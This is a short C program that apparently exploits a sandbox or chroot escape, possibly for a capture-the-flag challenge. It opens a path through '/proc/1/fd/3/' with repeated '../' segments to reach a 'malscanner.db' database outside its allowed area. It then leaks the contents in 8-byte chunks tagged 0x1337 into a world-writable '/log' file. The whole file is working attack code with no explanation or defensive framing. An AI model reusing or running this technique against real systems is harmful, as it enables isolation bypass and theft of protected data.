#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>

int main(int argc, char **argv) {
    size_t bytesRead = 0;

    int fd_to_read = open("/proc/1/fd/3/../../../../../../../var/www/malscanner/malscanner.db", O_RDONLY);
    if (fd_to_read == -1) {
        perror("Error opening file to read");
        return EXIT_FAILURE;
    }

    int fd_log = open("/log", O_WRONLY | O_APPEND | O_CREAT, 0777);
    if (fd_log == -1) {
        perror("Error opening log file");
        close(fd_to_read);
        return EXIT_FAILURE;
    }

    char buf[64] = {0};
    ((unsigned long*)buf)[0] = 0x1337;

    while ((bytesRead = read(fd_to_read, &buf[56], 8)) > 0) {
        ssize_t bytes_written = write(fd_log, buf, sizeof(buf));
        if (bytes_written != sizeof(buf)) {
            perror("Error writing to log file");
            close(fd_to_read);
            close(fd_log);
            return EXIT_FAILURE;
        }
    }

    close(fd_to_read);
    close(fd_log);
    return EXIT_SUCCESS;
}